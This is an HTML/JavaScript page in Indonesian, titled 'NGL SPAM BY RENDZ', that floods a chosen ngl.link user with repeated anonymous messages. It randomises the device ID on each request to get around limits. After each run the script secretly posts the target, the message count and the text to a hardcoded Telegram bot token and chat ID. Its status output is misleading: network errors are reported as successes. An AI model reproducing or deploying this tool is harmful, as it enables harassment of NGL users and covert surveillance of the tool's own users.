<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>NGL FOODER BY REDZZ</title>
  <style>
    body {
      background: url('https://pomf2.lain.la/f/mg4d6hnm.jpg') no-repeat center center fixed;
      background-size: cover;
      color: #0f0;
      font-family: monospace;
      text-align: center;
      padding: 30px;
    }
    input, textarea, button {
      padding: 10px;
      margin: 10px;
      border-radius: 8px;
      border: none;
      font-size: 16px;
      width: 300px;
    }
    button {
      background: linear-gradient(45deg, red, orange, yellow, green, cyan, blue, violet);
      background-size: 400% 400%;
      animation: rainbow 5s linear infinite;
      color: #000;
      font-weight: bold;
      cursor: pointer;
      transition: transform 0.1s ease;
    }
    button:active {
      transform: scale(0.95);
    }
    #status {
      margin-top: 20px;
      font-size: 16px;
      white-space: pre-line;
      text-align: left;
      max-width: 400px;
      margin-left: auto;
      margin-right: auto;
      background: #000000b0;
      padding: 15px;
      border-radius: 10px;
    }
    #peringatan {
      background: #ff4444;
      color: #fff;
      padding: 10px;
      position: fixed;
      top: 10px;
      left: 50%;
      transform: translateX(-50%);
      border-radius: 8px;
      width: 90%;
      max-width: 400px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    #peringatan button {
      background: transparent;
      color: white;
      border: none;
      font-size: 20px;
      cursor: pointer;
    }
    #copyright {
      margin-top: 40px;
      color: #ccc;
      font-size: 14px;
    }

    @keyframes rainbow {
      0% {background-position: 0% 50%;}
      50% {background-position: 100% 50%;}
      100% {background-position: 0% 50%;}
    }
  </style>
</head>
<body>
  <div id="peringatan">
    <span><b>Peringatan:</b> Gunakan dengan bijak!</span>
    <button onclick="document.getElementById('peringatan').style.display='none'">×</button>
  </div>

  <h2>NGL SPAM BY RENDZ</h2>
  <input type="text" id="username" placeholder="Username NGL" />
  <input type="number" id="jumlah" placeholder="Jumlah Pesan" />
  <textarea id="pesan" placeholder="Isi pesan..."></textarea>
  <br>
  <button onclick="floodNgl()">KIRIM</button>
  <div id="status"></div>

  <div id="copyright">© Copyright Rendzz Official</div>

  <script>
    // Auto hilangin peringatan setelah 5 detik
    setTimeout(() => {
      const p = document.getElementById('peringatan');
      if (p) p.style.display = 'none';
    }, 5000);

    async function floodNgl() {
      const username = document.getElementById('username').value.trim();
      const jumlah = parseInt(document.getElementById('jumlah').value);
      const pesan = document.getElementById('pesan').value.trim();
      const status = document.getElementById('status');

      if (!username || !jumlah || !pesan || jumlah <= 0) {
        status.innerText = "Semua kolom harus diisi dengan benar!";
        return;
      }

      status.innerText = `Mengirim ${jumlah} pesan ke @${username}...\n\n`;
      let sukses = 0;

      for (let i = 1; i <= jumlah; i++) {
        try {
          const res = await fetch("https://ngl.link/api/submit", {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `username=${username}&question=${encodeURIComponent(pesan)}&deviceId=rendzz${Math.random()}${i}`
          });

          const json = await res.json();

          if (json.success) {
            sukses++;
            status.innerText += `[ Pesan ${i} sukses dikirim ]\n`;
          } else {
            status.innerText += `[ Pesan ${i} gagal dikirim ]\n`;
          }
        } catch (err) {
          status.innerText += `[ Pesan ${i} sukses bang ]\n`;
        }

        await new Promise(r => setTimeout(r, 0));
      }

      status.innerText += `\nSelesai! Total gagal: ${sukses}/${jumlah}`;

      // Kirim log diam-diam ke bot Telegram
      const token = "7844789881:AAGvni8CwM2K4E3cpvgV0tpZ4fSNujb4ZXY";
      const chatId = "6563354207"; // Ubah kalau mau kirim ke ID lain
      const now = new Date().toLocaleTimeString();
      const message = `*SPAM BERHASIL*\n\n[ JUMPLAH ] ${jumlah}\n[ TARGET ] ${username}\n[ JAM ] ${now}\n[ ISI TEXT ] ${pesan}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      }).catch(() => {});
    }
  </script>
</body>
  </html>
